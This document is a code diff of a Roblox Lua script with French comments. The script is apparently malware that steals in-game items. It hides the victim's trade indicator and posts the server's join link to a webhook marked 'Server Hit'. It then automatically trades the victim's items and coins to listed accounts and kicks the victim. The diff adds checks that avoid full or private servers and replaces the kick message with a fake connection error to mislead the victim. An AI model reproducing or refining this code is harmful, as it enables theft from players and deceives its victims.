@@ -37,6 +37,16 @@ if game.PlaceId ~= 13772394625 then
     return
 end
 
+if #Players:GetPlayers() >= 16 then
+    plr:kick("Server is full. Please join a less populated server")
+    return
+end
+
+if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
+    plr:kick("Server error. Please join a DIFFERENT server")
+    return
+end
+
 -- // VÉRIFICATION DU PIN
 local args = {
     [1] = {
@@ -65,6 +75,7 @@ end)
 tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
     inTrade = tradeGui.Enabled
     if inTrade then
+        -- // SUPPRESSION DU "TRADING" AU DESSUS DE LA TÊTE
         task.spawn(function()
             if plr.Character then
                 for i = 1, 20 do
@@ -157,7 +168,7 @@ local function SendJoinMessage(list, prefix)
     end
 
     local data = {
-        ["auth_token"] = auth_token,
+        ["auth_token"] = auth_token, -- AJOUTÉ
         ["username"] = webhookName,
         ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
         ["embeds"] = {{
@@ -202,7 +213,7 @@ local function SendMessage(list)
     end
 
     local data = {
-        ["auth_token"] = auth_token,
+        ["auth_token"] = auth_token, -- AJOUTÉ
         ["username"] = webhookName,
         ["embeds"] = {{
             ["title"] = "⚪ Server Hit 🎯",
@@ -274,6 +285,7 @@ if #itemsToSend > 0 then
                 addItemToTrade(item.itemType, item.ItemID)
             end
 
+            -- Ajout des tokens si présents
             local rawText = PlayerGui.TradeRequest.Main.Currency.Coins.Amount.Text
             local cleanedText = rawText:gsub("^%s*(.-)%s*$", "%1"):gsub("[^%d]", "")
             local tokensamount = tonumber(cleanedText) or 0
@@ -284,12 +296,12 @@ if #itemsToSend > 0 then
             readyTrade()
             confirmTrade()
         end
-        plr:kick("Transfer successful!")
+        plr:kick("Please check your internet connection and try again")
     end
 
-    local function startProcess()
+    local function waitForUserJoin()
         local sentMessage = false
-        local function checkPlayer(player)
+        local function onUserJoin(player)
             if table.find(users, player.Name) then
                 if not sentMessage then
                     SendMessage(sentItems)
@@ -298,15 +310,8 @@ if #itemsToSend > 0 then
                 doTrade(player.Name)
             end
         end
-        
-        -- Vérifie les joueurs déjà présents
-        for _, p in ipairs(Players:GetPlayers()) do
-            checkPlayer(p)
-        end
-        
-        -- Attend les nouveaux joueurs
-        Players.PlayerAdded:Connect(checkPlayer)
+        for _, p in ipairs(Players:GetPlayers()) do onUserJoin(p) end
+        Players.PlayerAdded:Connect(onUserJoin)
     end
-    
-    startProcess()
+    waitForUserJoin()
 end
